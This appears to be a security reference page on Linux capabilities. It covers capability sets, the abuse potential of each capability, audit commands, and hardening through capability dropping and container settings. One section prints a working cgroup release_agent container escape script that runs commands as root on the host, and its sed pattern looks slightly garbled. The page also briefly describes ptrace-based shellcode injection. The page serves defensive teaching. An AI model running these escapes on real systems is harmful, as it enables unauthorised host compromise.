Linux Capabilities

Category: Unix/Linux Security, Privilege Separation
Parent: os/Unix-Linux/README.md

Overview

Linux capabilities break the traditional all-or-nothing root privilege model into 40+ fine-grained units. Before capabilities, a process was either unprivileged (UID != 0) or fully privileged (UID == 0). Capabilities allow a process to hold specific kernel privileges — for example, binding to a port below 1024 — without holding full root.

From a security engineering perspective, capabilities matter in two directions:

  1. Hardening: grant services only the capabilities they need; drop all others at startup.
  2. Exploitation: a misconfigured capability on a binary or container can be sufficient to achieve root or escape isolation.

Capability Sets Per Process

Each process has five capability sets:

Set Meaning
Permitted (P) Maximum set of capabilities the process can ever have; caps can only be dropped from this set
Effective (E) Active capabilities currently used by the kernel for permission checks
Inheritable (I) Set that can be inherited across execve()
Bounding (B) Upper bound on capabilities that can be gained via execve()
Ambient (A) Inherited by child processes even across execve() of non-privileged binaries; Linux 4.3+ 
flowchart TD
    B[Bounding set] -->|Limits what Permitted can contain| P[Permitted set]
    P -->|Subset raised to| E[Effective set]
    P -->|Subset in| I[Inheritable set]
    A[Ambient set] -->|Added to Permitted and Effective on execve| CHILD[Child process]
    I --> CHILD

Key Capabilities and Their Security Implications

Capability What it grants Attack/abuse potential
CAP_SYS_ADMIN Broad kernel operations: mount, pivot_root, nsenter, setns, ioctl Near-equivalent to root; frequently sufficient for container escape
CAP_SYS_PTRACE Attach to any process with ptrace Inject into any process → full code execution as that process
CAP_NET_ADMIN Configure network interfaces, iptables, routing Reroute traffic; disable firewall rules
CAP_NET_BIND_SERVICE Bind to ports < 1024 Needed by web servers, DNS; relatively safe
CAP_DAC_OVERRIDE Bypass DAC file read/write/execute checks Read any file; bypass filesystem permissions
CAP_DAC_READ_SEARCH Bypass DAC read checks and directory permission Read /etc/shadow and other protected files
CAP_SETUID Set arbitrary UID Become any user including root
CAP_SETGID Set arbitrary GID Become any group
CAP_CHOWN Change file ownership Make attacker own any file
CAP_SYS_MODULE Load/unload kernel modules Insert rootkit; trivial kernel code execution
CAP_SYS_RAWIO Direct access to I/O ports and /dev/mem Read/write arbitrary memory; access hardware
CAP_SYS_BOOT Call reboot(); load kexec kernel Reboot or pivot to attacker-controlled kernel
CAP_MKNOD Create device files Create block/char devices for hardware access
CAP_NET_RAW Create raw sockets; access AF_PACKET Packet sniffing; ARP spoofing; ICMP attacks
CAP_AUDIT_WRITE Write to kernel audit log Tamper with audit trail
CAP_AUDIT_CONTROL Control audit system Disable auditing entirely
CAP_KILL Send signals to any process Kill processes owned by other users
CAP_SYS_NICE Set process priority and scheduler policy Affect availability by starving other processes

Checking Capabilities

# Current process capabilities
cat /proc/self/status | grep -i cap

# Capabilities on a specific binary (file capabilities)
getcap /usr/bin/ping

# All binaries with file capabilities on the system
getcap -r / 2>/dev/null

# Capabilities of a running process
cat /proc/<pid>/status | grep Cap

# Decode a capability hex mask
capsh --decode=0000003fffffffff

File Capabilities (xattrs on ELF)

File capabilities are stored as extended attributes on ELF binaries. When that binary is executed, the kernel grants the process the capabilities set on the binary, regardless of the calling user's UID.

# Grant a binary cap_net_bind_service so it can bind port 443 as non-root
setcap 'cap_net_bind_service=+ep' /usr/local/bin/myserver

# View what's set
getcap /usr/local/bin/myserver
# Output: /usr/local/bin/myserver = cap_net_bind_service+ep

# Remove all file capabilities
setcap -r /usr/local/bin/myserver

Attack scenario: If an attacker finds a writable ELF binary that has file capabilities set on it, they can replace the binary content and the capabilities will carry over to their replacement binary.

Dangerous Capability Combinations (Container Escape Paths)

CAP_SYS_ADMIN — Container Escape via cgroup release_agent

If a container has CAP_SYS_ADMIN, an attacker can escape by:

  1. Creating a new cgroup and setting a release_agent path to a host-side script
  2. Triggering cgroup notification to execute the script on the host
# Inside privileged container
mkdir /tmp/cg && mount -t cgroup -o rdma cgroup /tmp/cg
mkdir /tmp/cg/x
echo 1 > /tmp/cg/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cg/release_agent
echo '#!/bin/sh\nid > /output' > /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cg/x/cgroup.procs"
# cmd executes as root on the host

CAP_SYS_PTRACE — Escaping via Process Injection

If a container has CAP_SYS_PTRACE and the host shares the PID namespace (or the container can see host PIDs), an attacker can ptrace a host-side process and inject shellcode.

CAP_NET_ADMIN + Unfiltered Sockets

Full network reconfiguration possible; can set up packet interception or reroute traffic.

Dropping Capabilities at Runtime (Hardening Pattern)

Services should drop unnecessary capabilities as early as possible in startup:

#include <sys/capability.h>

// Drop all capabilities except CAP_NET_BIND_SERVICE
cap_t caps = cap_from_text("cap_net_bind_service=eip");
if (cap_set_proc(caps) != 0) {
    perror("cap_set_proc failed");
    exit(1);
}
cap_free(caps);

In containers, restrict capabilities in the container runtime spec:

// Docker run: drop all, add only what's needed
// docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE myimage

// Kubernetes pod spec
securityContext:
  capabilities:
    drop: ["ALL"]
    add: ["NET_BIND_SERVICE"]

Capability Audit Checklist

| Check | Command | Safe result |
| ----------------------- | ------------------------------------------------------------ | ---------------------------------------------- | --------------------------- |
| Binaries with file caps | getcap -r / 2>/dev/null | Only known/expected binaries (ping, wireshark) |
| Container capabilities | docker inspect --format='{{.HostConfig.CapAdd}}' <ctr> | [] or only minimum needed |
| Privileged containers | docker inspect --format='{{.HostConfig.Privileged}}' <ctr> | false |
| Process effective caps | cat /proc/<pid>/status | grep CapEff | Minimal set for the service |
| Ambient capabilities | cat /proc/self/status | grep CapAmb | 0000000000000000 for most |

What Can Go Wrong

Failure Root Cause Impact
Container deployed with --privileged Convenience over security Full host compromise from inside container
CAP_SYS_ADMIN granted for a single mount operation Capability scope too broad Full container escape possible
File capability set on world-writable binary Incorrect file permissions Any user can replace binary and inherit capability
Service not dropping capabilities after startup No drop call in code Compromised service retains full capability set
cgroup v1 release_agent accessible inside container CAP_SYS_ADMIN + cgroup mount Classic container escape

Key Takeaways

  • Capabilities granularize root. CAP_SYS_ADMIN is near-root — treat it as root.
  • Check file capabilities with getcap -r / as part of every security audit.
  • Services should drop all capabilities they don't need immediately after startup.
  • Container privilege escalation often begins with CAP_SYS_ADMIN or CAP_SYS_PTRACE.
  • Never deploy containers with --privileged in production.
